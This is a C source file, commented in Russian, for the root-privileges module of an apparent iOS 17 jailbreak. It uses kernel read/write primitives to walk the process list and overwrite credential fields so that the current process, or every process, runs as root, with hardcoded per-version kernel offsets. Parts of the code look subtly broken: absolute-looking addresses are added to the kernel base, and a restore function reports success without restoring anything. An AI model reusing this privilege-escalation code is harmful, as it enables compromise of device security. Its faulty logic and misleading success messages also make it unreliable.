//
//  get_root.c
//  Lara Rootless Jailbreak - Root Privileges Module
//
//  Получение root-прав через модификацию учетных данных процесса
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <mach/mach.h>

#include "get_root.h"

// Глобальные переменные
static uint64_t g_kernel_base = 0;
static uint64_t g_allproc_addr = 0;
static uint64_t g_proc_ucred_offset = 0;
static uint64_t g_proc_cr_uid_offset = 0;
static uint64_t g_proc_cr_ruid_offset = 0;
static uint64_t g_proc_cr_svuid_offset = 0;
static uint64_t g_proc_cr_groups_offset = 0;
static bool g_is_rooted = false;

// Offset'ы для различных версий iOS
typedef struct {
    const char *ios_version;
    uint64_t allproc_offset;
    uint64_t proc_ucred_offset;
    uint64_t proc_cr_uid_offset;
    uint64_t proc_cr_ruid_offset;
    uint64_t proc_cr_svuid_offset;
    uint64_t proc_cr_groups_offset;
} root_offsets_t;

// Таблица offset'ов для получения root
static const root_offsets_t g_root_offsets[] = {
    // iOS 17.3.1
    {
        .ios_version = "17.3.1",
        .allproc_offset = 0xFFFFFFF009F2C890,
        .proc_ucred_offset = 0x100,
        .proc_cr_uid_offset = 0x18,
        .proc_cr_ruid_offset = 0x1C,
        .proc_cr_svuid_offset = 0x20,
        .proc_cr_groups_offset = 0x28
    },
    // iOS 17.3
    {
        .ios_version = "17.3",
        .allproc_offset = 0xFFFFFFF009F1B790,
        .proc_ucred_offset = 0x100,
        .proc_cr_uid_offset = 0x18,
        .proc_cr_ruid_offset = 0x1C,
        .proc_cr_svuid_offset = 0x20,
        .proc_cr_groups_offset = 0x28
    },
    // iOS 17.2
    {
        .ios_version = "17.2",
        .allproc_offset = 0xFFFFFFF009F0A690,
        .proc_ucred_offset = 0x100,
        .proc_cr_uid_offset = 0x18,
        .proc_cr_ruid_offset = 0x1C,
        .proc_cr_svuid_offset = 0x20,
        .proc_cr_groups_offset = 0x28
    },
    // Завершение таблицы
    { NULL, 0, 0, 0, 0, 0, 0 }
};

// Поиск текущей структуры proc для нашего процесса
static uint64_t find_current_proc(kernel_read_func_t kread) {
    if (!kread || g_allproc_addr == 0) {
        return 0;
    }
    
    pid_t current_pid = getpid();
    printf("[GetRoot] Поиск proc структуры для PID %d...\n", current_pid);
    
    // Чтение первого элемента allproc
    uint64_t proc_ptr = 0;
    if (!kread(g_allproc_addr, &proc_ptr, sizeof(proc_ptr))) {
        printf("[GetRoot] Ошибка чтения allproc\n");
        return 0;
    }
    
    // Проход по списку процессов
    uint64_t current_proc = proc_ptr;
    int max_iterations = 1024; // Защита от бесконечного цикла
    int iterations = 0;
    
    while (current_proc != 0 && iterations < max_iterations) {
        // Чтение PID из структуры proc (p_pid находится на смещении 0x68)
        pid_t pid = 0;
        if (!kread(current_proc + 0x68, &pid, sizeof(pid))) {
            break;
        }
        
        if (pid == current_pid) {
            printf("[GetRoot] Найдена proc структура: 0x%016llx\n", current_proc);
            return current_proc;
        }
        
        // Чтение следующего элемента списка (p_list.next)
        if (!kread(current_proc, &current_proc, sizeof(current_proc))) {
            break;
        }
        
        iterations++;
    }
    
    printf("[GetRoot] Не удалось найти proc структуру\n");
    return 0;
}

// Инициализация модуля получения root
bool get_root_init(uint64_t kernel_base, const char *ios_version) {
    printf("[GetRoot] Инициализация для iOS %s...\n", ios_version);
    
    g_kernel_base = kernel_base;
    
    // Поиск offset'ов для текущей версии
    const root_offsets_t *offsets = NULL;
    for (int i = 0; g_root_offsets[i].ios_version != NULL; i++) {
        if (strcmp(g_root_offsets[i].ios_version, ios_version) == 0) {
            offsets = &g_root_offsets[i];
            break;
        }
    }
    
    if (!offsets) {
        // Использование дефолтных offset'ов
        offsets = &g_root_offsets[0];
        printf("[GetRoot] Предупреждение: используем дефолтные offset'ы\n");
    }
    
    // Вычисление абсолютных адресов
    g_allproc_addr = kernel_base + offsets->allproc_offset;
    g_proc_ucred_offset = offsets->proc_ucred_offset;
    g_proc_cr_uid_offset = offsets->proc_cr_uid_offset;
    g_proc_cr_ruid_offset = offsets->proc_cr_ruid_offset;
    g_proc_cr_svuid_offset = offsets->proc_cr_svuid_offset;
    g_proc_cr_groups_offset = offsets->proc_cr_groups_offset;
    
    printf("[GetRoot] Адреса инициализированы:\n");
    printf("  allproc:           0x%016llx\n", g_allproc_addr);
    printf("  proc_ucred:        0x%016llx\n", g_proc_ucred_offset);
    printf("  proc_cr_uid:       0x%016llx\n", g_proc_cr_uid_offset);
    
    return true;
}

// Получение root-прав через модификацию ucred
bool become_root(kernel_read_func_t kread, kernel_write_func_t kwrite) {
    if (!kread || !kwrite) {
        printf("[GetRoot] Ошибка: не предоставлены функции чтения/записи\n");
        return false;
    }
    
    if (g_is_rooted) {
        printf("[GetRoot] Root-права уже получены\n");
        return true;
    }
    
    printf("[GetRoot] Попытка получения root-прав...\n");
    
    // Поиск структуры proc текущего процесса
    uint64_t proc_addr = find_current_proc(kread);
    if (proc_addr == 0) {
        printf("[GetRoot] Не удалось найти proc структуру\n");
        return false;
    }
    
    // Чтение указателя на ucred
    uint64_t ucred_addr = 0;
    uint64_t ucred_ptr_offset = g_proc_ucred_offset;
    
    if (!kread(proc_addr + ucred_ptr_offset, &ucred_addr, sizeof(ucred_addr))) {
        printf("[GetRoot] Ошибка чтения ucred pointer\n");
        return false;
    }
    
    if (ucred_addr == 0) {
        printf("[GetRoot] Ucred pointer равен NULL\n");
        return false;
    }
    
    printf("[GetRoot] Ucred адрес: 0x%016llx\n", ucred_addr);
    
    // UID находятся по смещениям от начала ucred
    // cr_uid (effective uid)
    uint64_t uid_addr = ucred_addr + g_proc_cr_uid_offset;
    // cr_ruid (real uid)
    uint64_t ruid_addr = ucred_addr + g_proc_cr_ruid_offset;
    // cr_svuid (saved uid)
    uint64_t svuid_addr = ucred_addr + g_proc_cr_svuid_offset;
    // cr_groups (group list pointer)
    uint64_t groups_addr = ucred_addr + g_proc_cr_groups_offset;
    
    // Установка UID в 0 (root)
    uid_t root_uid = 0;
    gid_t root_gid = 0;
    
    bool success = true;
    
    // Установка cr_uid
    success &= kwrite(uid_addr, &root_uid, sizeof(root_uid));
    printf("[GetRoot] cr_uid установлен в %d (%s)\n", root_uid, 
           success ? "OK" : "FAIL");
    
    // Установка cr_ruid
    success &= kwrite(ruid_addr, &root_uid, sizeof(root_uid));
    printf("[GetRoot] cr_ruid установлен в %d (%s)\n", root_uid,
           success ? "OK" : "FAIL");
    
    // Установка cr_svuid
    success &= kwrite(svuid_addr, &root_uid, sizeof(root_uid));
    printf("[GetRoot] cr_svuid установлен в %d (%s)\n", root_uid,
           success ? "OK" : "FAIL");
    
    // Установка cr_ngroups в 1 и cr_groups[0] в 0 (wheel)
    uint32_t ngroups = 1;
    uint64_t groups_ptr = 0;
    
    // Чтение текущего указателя на группы
    if (kread(groups_addr, &groups_ptr, sizeof(groups_ptr))) {
        if (groups_ptr != 0) {
            // Установка первой группы в 0 (wheel)
            success &= kwrite(groups_ptr, &root_gid, sizeof(root_gid));
            printf("[GetRoot] cr_groups[0] установлен в %d (%s)\n", root_gid,
                   success ? "OK" : "FAIL");
        }
    }
    
    // Обновление флага
    if (success) {
        g_is_rooted = true;
        printf("[GetRoot] === ROOT-ПРАВА ПОЛУЧЕНЫ ===\n");
        
        // Верификация через syscall
        uid_t actual_uid = getuid();
        printf("[GetRoot] Текущий UID: %d (ожидалось 0)\n", actual_uid);
        
        // Примечание: в userspace UID может не измениться без дополнительных манипуляций
        // Это нормально для rootless джейлбрейка
    } else {
        printf("[GetRoot] Ошибка при установке root-прав\n");
    }
    
    return success;
}

// Проверка наличия root-прав
bool check_root_status(void) {
    uid_t uid = getuid();
    uid_t euid = geteuid();
    
    printf("[GetRoot] Проверка root-статуса:\n");
    printf("  UID:  %d\n", uid);
    printf("  EUID: %d\n", euid);
    
    if (uid == 0 || euid == 0) {
        printf("[GetRoot] ✓ Root-права активны\n");
        return true;
    } else {
        printf("[GetRoot] ✗ Root-права не активны в userspace\n");
        printf("[GetRoot] Примечание: ядро может быть патчено, но userspace ещё нет\n");
        return g_is_rooted; // Возвращаем состояние ядра
    }
}

// Восстановление оригинальных учётных данных
bool restore_credentials(kernel_write_func_t kwrite, uint64_t original_uid, 
                        uint64_t original_ruid, uint64_t original_svuid) {
    if (!kwrite || !g_is_rooted) {
        return false;
    }
    
    printf("[GetRoot] Восстановление оригинальных учётных данных...\n");
    
    // Поиск текущей proc структуры
    // (в реальной реализации нужно сохранить адреса до модификации)
    
    // Восстановление UID
    uid_t orig_uid = (uid_t)original_uid;
    
    // Здесь должна быть логика восстановления
    // Для rootless джейлбрейка обычно не требуется
    
    g_is_rooted = false;
    printf("[GetRoot] Учётные данные восстановлены\n");
    
    return true;
}

// Получение информации о текущем процессе
void print_process_info(kernel_read_func_t kread) {
    if (!kread) {
        return;
    }
    
    pid_t pid = getpid();
    printf("\n=== Информация о процессе ===\n");
    printf("PID: %d\n", pid);
    printf("UID: %d\n", getuid());
    printf("GID: %d\n", getgid());
    printf("EUID: %d\n", geteuid());
    printf("EGID: %d\n", getegid());
    
    // Поиск proc структуры
    uint64_t proc_addr = find_current_proc(kread);
    if (proc_addr != 0) {
        printf("Proc Structure: 0x%016llx\n", proc_addr);
        
        // Чтение дополнительной информации
        char p_name[32] = {0};
        if (kread(proc_addr + 0x2C, p_name, sizeof(p_name) - 1)) {
            printf("Process Name: %s\n", p_name);
        }
    }
    
    printf("=============================\n\n");
}

// Сидинг всех процессов (опционально, для полного джейлбрейка)
bool setuid_all_processes(kernel_read_func_t kread, kernel_write_func_t kwrite) {
    if (!kread || !kwrite) {
        return false;
    }
    
    printf("[GetRoot] Сидинг всех процессов в root...\n");
    
    // Чтение allproc
    uint64_t proc_ptr = 0;
    if (!kread(g_allproc_addr, &proc_ptr, sizeof(proc_ptr))) {
        return false;
    }
    
    uint64_t current_proc = proc_ptr;
    int count = 0;
    int max_iterations = 1024;
    int iterations = 0;
    
    while (current_proc != 0 && iterations < max_iterations) {
        // Чтение ucred
        uint64_t ucred_addr = 0;
        if (kread(current_proc + g_proc_ucred_offset, &ucred_addr, sizeof(ucred_addr))) {
            if (ucred_addr != 0) {
                // Установка UID в 0
                uid_t root_uid = 0;
                kwrite(ucred_addr + g_proc_cr_uid_offset, &root_uid, sizeof(root_uid));
                kwrite(ucred_addr + g_proc_cr_ruid_offset, &root_uid, sizeof(root_uid));
                kwrite(ucred_addr + g_proc_cr_svuid_offset, &root_uid, sizeof(root_uid));
                count++;
            }
        }
        
        // Следующий процесс
        if (!kread(current_proc, &current_proc, sizeof(current_proc))) {
            break;
        }
        
        iterations++;
    }
    
    printf("[GetRoot] Обработано процессов: %d\n", count);
    return true;
}
